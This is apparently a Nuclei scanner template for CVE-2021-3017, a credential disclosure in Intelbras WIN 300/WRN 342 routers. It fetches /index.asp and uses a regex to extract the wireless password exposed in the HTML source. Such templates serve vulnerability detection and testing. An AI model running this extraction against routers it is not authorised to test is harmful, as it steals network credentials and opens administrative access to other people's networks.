http:
- extractors:
  - part: body
    regex:
    - def_wirelesspassword = "([A-Za-z0-9=]+)";
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - def_wirelesspassword =
    - <title>Roteador Wireless</title>
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/index.asp'
id: CVE-2021-3017
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:h:intelbras:win_300:-:*:*:*:*:*:*:*
    cve-id: CVE-2021-3017
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    epss-percentile: 0.98556
    epss-score: 0.68784
  description: Intelbras WIN 300 and WRN 342 devices through 2021-01-04 allows remote
    attackers to discover credentials by reading the def_wirelesspassword line in
    the HTML source code.
  impact: 'An attacker can gain unauthorized access to the router''s administrative
    interface and potentially compromise the entire network.

    '
  metadata:
    max-request: 1
    product: win_300
    vendor: intelbras
  name: Intelbras WIN 300/WRN 342 - Credentials Disclosure
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-3017
  - https://pastebin.com/cTYTf0Yn
  - https://github.com/bigblackhat/oFx
  - https://github.com/openx-org/BLEN
  - https://github.com/Miraitowa70/POC-Notes
  remediation: 'Update the router firmware to the latest version, which includes a
    fix for the vulnerability.

    '
  severity: high
  tags: cve2021,cve,exposure,router,intelbras,vuln
